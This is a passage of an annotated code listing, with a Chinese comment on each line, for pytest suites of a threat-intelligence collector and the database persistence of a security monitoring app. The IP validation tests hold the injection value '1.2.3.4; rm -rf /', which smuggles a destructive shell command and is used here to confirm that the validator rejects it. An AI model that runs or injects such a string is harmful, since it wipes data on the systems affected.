| 299 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 300 | 装饰器：为下面的函数或类附加框架行为。 | `    @pytest.mark.parametrize('ip', [` |
| 301 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '999.999.999.999',` |
| 302 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '1.2.3',` |
| 303 | 代码语句：参与当前文件的业务流程或数据处理。 | `        'abc',` |
| 304 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '',` |
| 305 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '1.2.3.4.5',` |
| 306 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '256.1.1.1',` |
| 307 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '1.2.3.4; rm -rf /',` |
| 308 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '01.02.03.04',   # 拒绝前导 0` |
| 309 | 代码语句：参与当前文件的业务流程或数据处理。 | `        '1.2.3.-1',` |
| 310 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ])` |
| 311 | 函数定义：声明 `test_validate_ip_invalid` 的输入、处理逻辑和返回结果。 | `    def test_validate_ip_invalid(self, ip):` |
| 312 | 文档字符串：说明当前模块、类或函数的职责。 | `        """非法 IP 地址必须被拒绝（防止注入）"""` |
| 313 | 断言：验证测试或运行时假设是否成立。 | `        assert ThreatIntelCollector._validate_ip(ip) is False` |
| 314 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 315 | 函数定义：声明 `test_validate_ip_non_string` 的输入、处理逻辑和返回结果。 | `    def test_validate_ip_non_string(self):` |
| 316 | 文档字符串：说明当前模块、类或函数的职责。 | `        """非字符串输入安全返回 False"""` |
| 317 | 断言：验证测试或运行时假设是否成立。 | `        assert ThreatIntelCollector._validate_ip(None) is False` |
| 318 | 断言：验证测试或运行时假设是否成立。 | `        assert ThreatIntelCollector._validate_ip(123) is False` |
| 319 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 320 | 函数定义：声明 `test_check_ip_invalid_format` 的输入、处理逻辑和返回结果。 | `    def test_check_ip_invalid_format(self):` |
| 321 | 文档字符串：说明当前模块、类或函数的职责。 | `        """无效 IP 格式返回安全默认值"""` |
| 322 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector()` |
| 323 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = collector.check_ip('not-an-ip')` |
| 324 | 断言：验证测试或运行时假设是否成立。 | `        assert result['is_malicious'] is False` |
| 325 | 断言：验证测试或运行时假设是否成立。 | `        assert result['reason'] == 'invalid_ip_format'` |
| 326 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 327 | 函数定义：声明 `test_check_ip_cache_hit` 的输入、处理逻辑和返回结果。 | `    def test_check_ip_cache_hit(self):` |
| 328 | 文档字符串：说明当前模块、类或函数的职责。 | `        """本地缓存命中时直接返回"""` |
| 329 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector()` |
| 330 | 函数调用：执行已有函数/方法完成当前步骤。 | `        collector.add_ip_to_blacklist('1.2.3.4')` |
| 331 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = collector.check_ip('1.2.3.4')` |
| 332 | 断言：验证测试或运行时假设是否成立。 | `        assert result['is_malicious'] is True` |
| 333 | 断言：验证测试或运行时假设是否成立。 | `        assert result['source'] == 'local'` |
| 334 | 断言：验证测试或运行时假设是否成立。 | `        assert result['ioc_value'] == '1.2.3.4'` |
| 335 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 336 | 函数定义：声明 `test_check_ip_no_api_key` 的输入、处理逻辑和返回结果。 | `    def test_check_ip_no_api_key(self):` |
| 337 | 文档字符串：说明当前模块、类或函数的职责。 | `        """无 API Key 且不在缓存时返回非恶意"""` |
| 338 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector()` |
| 339 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = collector.check_ip('8.8.8.8')` |
| 340 | 断言：验证测试或运行时假设是否成立。 | `        assert result['is_malicious'] is False` |
| 341 | 断言：验证测试或运行时假设是否成立。 | `        assert result['source'] == 'none'` |
| 342 | 断言：验证测试或运行时假设是否成立。 | `        assert result.get('ioc_value') == '8.8.8.8'` |
| 343 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 344 | 装饰器：为下面的函数或类附加框架行为。 | `    @patch('src.collectors.ioc_providers.requests.get')` |
| 345 | 函数定义：声明 `test_query_abuseipdb_malicious` 的输入、处理逻辑和返回结果。 | `    def test_query_abuseipdb_malicious(self, mock_get):` |
| 346 | 文档字符串：说明当前模块、类或函数的职责。 | `        """AbuseIPDB 返回高分时应标记为恶意"""` |
| 347 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mock_resp = MagicMock()` |
| 348 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mock_resp.raise_for_status.return_value = None` |
| 349 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mock_resp.json.return_value = {'data': {'abuseConfidenceScore': 90}}` |
| 350 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mock_get.return_value = mock_resp` |
| 351 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 352 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector(abuseipdb_key='fake-key', external_wait_sec=5.0)` |
| 353 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = collector.check_ip('1.2.3.4')` |
| 354 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 355 | 断言：验证测试或运行时假设是否成立。 | `        assert result['is_malicious'] is True` |
| 356 | 断言：验证测试或运行时假设是否成立。 | `        assert result['source'] == 'abuseipdb'` |
| 357 | 断言：验证测试或运行时假设是否成立。 | `        assert result['score'] == 90` |
| 358 | 函数调用：执行已有函数/方法完成当前步骤。 | `        mock_get.assert_called_once()` |
| 359 | 代码语句：参与当前文件的业务流程或数据处理。 | `        _args, kwargs = mock_get.call_args` |
| 360 | 断言：验证测试或运行时假设是否成立。 | `        assert kwargs.get('timeout') == collector.external_http_timeout` |
| 361 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 362 | 装饰器：为下面的函数或类附加框架行为。 | `    @patch('src.collectors.ioc_providers.requests.get')` |
| 363 | 函数定义：声明 `test_query_abuseipdb_benign` 的输入、处理逻辑和返回结果。 | `    def test_query_abuseipdb_benign(self, mock_get):` |
| 364 | 文档字符串：说明当前模块、类或函数的职责。 | `        """AbuseIPDB 返回低分时不标记为恶意"""` |
| 365 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mock_resp = MagicMock()` |
| 366 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mock_resp.raise_for_status.return_value = None` |
| 367 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mock_resp.json.return_value = {'data': {'abuseConfidenceScore': 10}}` |
| 368 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mock_get.return_value = mock_resp` |
| 369 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 370 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector(abuseipdb_key='fake-key', external_wait_sec=5.0)` |
| 371 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = collector.check_ip('1.2.3.4')` |
| 372 | 断言：验证测试或运行时假设是否成立。 | `        assert result['is_malicious'] is False` |
| 373 | 断言：验证测试或运行时假设是否成立。 | `        assert result['source'] == 'none'` |
| 374 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 375 | 装饰器：为下面的函数或类附加框架行为。 | `    @patch('src.collectors.ioc_providers.requests.get')` |
| 376 | 函数定义：声明 `test_query_abuseipdb_timeout` 的输入、处理逻辑和返回结果。 | `    def test_query_abuseipdb_timeout(self, mock_get):` |
| 377 | 文档字符串：说明当前模块、类或函数的职责。 | `        """AbuseIPDB 请求超时时应安全降级"""` |
| 378 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `        import requests as req_mod` |
| 379 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 380 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mock_get.side_effect = req_mod.exceptions.Timeout('timeout')` |
| 381 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector(abuseipdb_key='fake-key', external_wait_sec=5.0)` |
| 382 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = collector.check_ip('1.2.3.4')` |
| 383 | 断言：验证测试或运行时假设是否成立。 | `        assert result['is_malicious'] is False` |
| 384 | 断言：验证测试或运行时假设是否成立。 | `        assert result['source'] == 'none'` |
| 385 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 386 | 装饰器：为下面的函数或类附加框架行为。 | `    @patch('src.collectors.ioc_providers.requests.get')` |
| 387 | 函数定义：声明 `test_query_abuseipdb_network_error` 的输入、处理逻辑和返回结果。 | `    def test_query_abuseipdb_network_error(self, mock_get):` |
| 388 | 文档字符串：说明当前模块、类或函数的职责。 | `        """网络异常时安全降级"""` |
| 389 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `        import requests as req_mod` |
| 390 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 391 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mock_get.side_effect = req_mod.exceptions.ConnectionError('conn err')` |
| 392 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector(abuseipdb_key='fake-key', external_wait_sec=5.0)` |
| 393 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = collector.check_ip('1.2.3.4')` |
| 394 | 断言：验证测试或运行时假设是否成立。 | `        assert result['is_malicious'] is False` |
| 395 | 断言：验证测试或运行时假设是否成立。 | `        assert result['source'] == 'none'` |
| 396 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 397 | 函数定义：声明 `test_check_domain_empty` 的输入、处理逻辑和返回结果。 | `    def test_check_domain_empty(self):` |
| 398 | 文档字符串：说明当前模块、类或函数的职责。 | `        """空域名安全处理"""` |
| 399 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector()` |
| 400 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.check_domain('') == {` |
| 401 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'is_malicious': False, 'source': 'none'` |
| 402 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 403 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.check_domain(None) == {` |
| 404 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'is_malicious': False, 'source': 'none'` |
| 405 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 406 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 407 | 函数定义：声明 `test_check_domain_cached` 的输入、处理逻辑和返回结果。 | `    def test_check_domain_cached(self):` |
| 408 | 文档字符串：说明当前模块、类或函数的职责。 | `        """域名缓存命中（大小写不敏感）"""` |
| 409 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector()` |
| 410 | 函数调用：执行已有函数/方法完成当前步骤。 | `        collector.add_domain_to_blacklist('Evil.COM')` |
| 411 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = collector.check_domain('evil.com')` |
| 412 | 断言：验证测试或运行时假设是否成立。 | `        assert result['is_malicious'] is True` |
| 413 | 断言：验证测试或运行时假设是否成立。 | `        assert result['source'] == 'local'` |
| 414 | 断言：验证测试或运行时假设是否成立。 | `        assert result['ioc_value'] == 'evil.com'` |
| 415 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 416 | 函数定义：声明 `test_check_domain_unknown` 的输入、处理逻辑和返回结果。 | `    def test_check_domain_unknown(self):` |
| 417 | 文档字符串：说明当前模块、类或函数的职责。 | `        """未知域名返回非恶意"""` |
| 418 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector()` |
| 419 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r = collector.check_domain('benign.example.com')` |
| 420 | 断言：验证测试或运行时假设是否成立。 | `        assert r['is_malicious'] is False` |
| 421 | 断言：验证测试或运行时假设是否成立。 | `        assert r['source'] == 'none'` |
| 422 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 423 | 函数定义：声明 `test_get_blacklist_stats_structure` 的输入、处理逻辑和返回结果。 | `    def test_get_blacklist_stats_structure(self):` |
| 424 | 文档字符串：说明当前模块、类或函数的职责。 | `        """统计结构包含必需字段"""` |
| 425 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector()` |
| 426 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stats = collector.get_blacklist_stats()` |
| 427 | 断言：验证测试或运行时假设是否成立。 | `        assert 'ip_count' in stats` |
| 428 | 断言：验证测试或运行时假设是否成立。 | `        assert 'domain_count' in stats` |
| 429 | 断言：验证测试或运行时假设是否成立。 | `        assert 'last_update' in stats` |
| 430 | 断言：验证测试或运行时假设是否成立。 | `        assert stats['ip_count'] == 0` |
| 431 | 断言：验证测试或运行时假设是否成立。 | `        assert stats['last_update'] is None` |
| 432 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 433 | 函数定义：声明 `test_update_blacklist_updates_timestamp` 的输入、处理逻辑和返回结果。 | `    def test_update_blacklist_updates_timestamp(self):` |
| 434 | 文档字符串：说明当前模块、类或函数的职责。 | `        """update_blacklist 后 last_update 不再为 None"""` |
| 435 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector()` |
| 436 | 函数调用：执行已有函数/方法完成当前步骤。 | `        collector.update_blacklist()` |
| 437 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stats = collector.get_blacklist_stats()` |
| 438 | 断言：验证测试或运行时假设是否成立。 | `        assert stats['last_update'] is not None` |
| 439 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 440 | 函数定义：声明 `test_add_ip_to_blacklist_rejects_invalid` 的输入、处理逻辑和返回结果。 | `    def test_add_ip_to_blacklist_rejects_invalid(self):` |
| 441 | 文档字符串：说明当前模块、类或函数的职责。 | `        """拒绝把非法 IP 加入黑名单"""` |
| 442 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector()` |
| 443 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.add_ip_to_blacklist('1.2.3.4; rm -rf /') is False` |
| 444 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.get_blacklist_stats()['ip_count'] == 0` |
| 445 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 446 | 函数定义：声明 `test_thread_safety_check_ip` 的输入、处理逻辑和返回结果。 | `    def test_thread_safety_check_ip(self):` |
| 447 | 文档字符串：说明当前模块、类或函数的职责。 | `        """多线程并发 check_ip 不会崩溃或数据竞争"""` |
| 448 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `        import threading as th` |
| 449 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 450 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = ThreatIntelCollector()` |
| 451 | 函数调用：执行已有函数/方法完成当前步骤。 | `        collector.add_ip_to_blacklist('1.2.3.4')` |
| 452 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 453 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results = []` |
| 454 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        errors = []` |
| 455 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 456 | 函数定义：声明 `worker` 的输入、处理逻辑和返回结果。 | `        def worker():` |
| 457 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 458 | 循环：逐个处理集合或迭代器中的元素。 | `                for _ in range(50):` |
| 459 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    r = collector.check_ip('1.2.3.4')` |
| 460 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    results.append(r['is_malicious'])` |
| 461 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 462 | 函数调用：执行已有函数/方法完成当前步骤。 | `                errors.append(exc)` |
| 463 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 464 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threads = [th.Thread(target=worker) for _ in range(8)]` |
| 465 | 循环：逐个处理集合或迭代器中的元素。 | `        for t in threads:` |
| 466 | 函数调用：执行已有函数/方法完成当前步骤。 | `            t.start()` |
| 467 | 循环：逐个处理集合或迭代器中的元素。 | `        for t in threads:` |
| 468 | 函数调用：执行已有函数/方法完成当前步骤。 | `            t.join()` |
| 469 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 470 | 断言：验证测试或运行时假设是否成立。 | `        assert not errors` |
| 471 | 断言：验证测试或运行时假设是否成立。 | `        assert all(results)` |
| 472 | 断言：验证测试或运行时假设是否成立。 | `        assert len(results) == 8 * 50` |
| 473 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 474 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 475 | 条件判断：满足条件时进入对应分支。 | `if __name__ == '__main__':  # pragma: no cover` |
| 476 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.exit(pytest.main([__file__, '-v']))` |

## `tests/test_db_persistence.py`

- 类型：测试
- 行数：277

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import uuid` |
| 4 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timezone` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 7 | 函数定义：声明 `_build_test_app` 的输入、处理逻辑和返回结果。 | `def _build_test_app(monkeypatch, tmp_path):` |
| 8 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    db_file = tmp_path / "guardian_test.db"` |
| 9 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("FLASK_ENV", "testing")` |
| 10 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("DATABASE_URL", f"sqlite:///{db_file.as_posix()}")` |
| 11 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("SECRET_KEY", "test-secret-key-which-is-at-least-32b")` |
| 12 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_USERNAME", "admin")` |
| 13 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_PASSWORD", "changeme")` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, _ = create_app()` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["TESTING"] = True` |
| 19 | 返回结果：把处理后的值交回调用方。 | `    return app` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 函数定义：声明 `_auth_headers` 的输入、处理逻辑和返回结果。 | `def _auth_headers(client):` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    resp = client.post(` |
| 24 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "/api/auth/login",` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        json={"username": "admin", "password": "changeme"},` |
| 26 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    token = resp.get_json()["access_token"]` |
| 28 | 返回结果：把处理后的值交回调用方。 | `    return {"Authorization": f"Bearer {token}"}` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 函数定义：声明 `test_all_r2_tables_can_be_created` 的输入、处理逻辑和返回结果。 | `def test_all_r2_tables_can_be_created(monkeypatch, tmp_path):` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _build_test_app(monkeypatch, tmp_path)` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 导入对象：从指定模块引入类、函数或常量。 | `    from sqlalchemy import inspect` |
| 35 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 36 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    expected_tables = {` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "alerts",` |
| 39 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "alert_histories",` |
| 40 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "rules",` |
| 41 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "iocs",` |
| 42 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "settings",` |
| 43 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "banned_ips",` |
| 44 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "response_actions",` |
| 45 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "response_schedule_tasks",` |
| 46 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "audit_events",` |
| 47 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "model_versions",` |
| 48 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 49 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        inspector = inspect(db.engine)` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        existing = set(inspector.get_table_names())` |
| 52 | 断言：验证测试或运行时假设是否成立。 | `    assert expected_tables.issubset(existing)` |
| 53 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 54 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 55 | 函数定义：声明 `test_alert_insert_and_query` 的输入、处理逻辑和返回结果。 | `def test_alert_insert_and_query(monkeypatch, tmp_path):` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _build_test_app(monkeypatch, tmp_path)` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 59 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.models import Alert` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert_id = uuid.uuid4().hex` |
| 62 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert = Alert(` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            id=alert_id,` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            external_id="redis-1",` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            timestamp=datetime.now(timezone.utc),` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            source_ip="1.2.3.4",` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            target_ip="10.0.0.2",` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            threat_type="sql_injection",` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            level="high",` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            confidence=0.97,` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            engine="fusion-v1",` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            status="open",` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            summary="SQL 注入告警",` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            raw_payload="{\"sample\": true}",` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            model_version="v1.0.0",` |
| 77 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 78 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.add(alert)` |
| 79 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 80 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        queried = db.session.get(Alert, alert_id)` |
| 82 | 断言：验证测试或运行时假设是否成立。 | `        assert queried is not None` |
| 83 | 断言：验证测试或运行时假设是否成立。 | `        assert queried.threat_type == "sql_injection"` |
| 84 | 断言：验证测试或运行时假设是否成立。 | `        assert queried.status == "open"` |
| 85 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 86 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 87 | 函数定义：声明 `test_alert_history_status_transition` 的输入、处理逻辑和返回结果。 | `def test_alert_history_status_transition(monkeypatch, tmp_path):` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _build_test_app(monkeypatch, tmp_path)` |
| 89 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 90 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 91 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.models import Alert, AlertHistory` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert_id = uuid.uuid4().hex` |
| 94 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 95 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.add(` |
| 96 | 函数调用：执行已有函数/方法完成当前步骤。 | `            Alert(` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                id=alert_id,` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                timestamp=datetime.now(timezone.utc),` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                source_ip="8.8.8.8",` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_type="dos",` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                level="medium",` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                status="open",` |
| 103 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 104 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 105 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 106 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 107 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.add(` |
| 108 | 函数调用：执行已有函数/方法完成当前步骤。 | `            AlertHistory(` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_id=alert_id,` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                from_status="open",` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                to_status="acknowledged",` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                operator="tester",` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                note="已确认告警",` |
| 114 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 115 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 116 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 117 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rows = (` |
| 119 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.query(AlertHistory)` |
| 120 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .filter(AlertHistory.alert_id == alert_id)` |
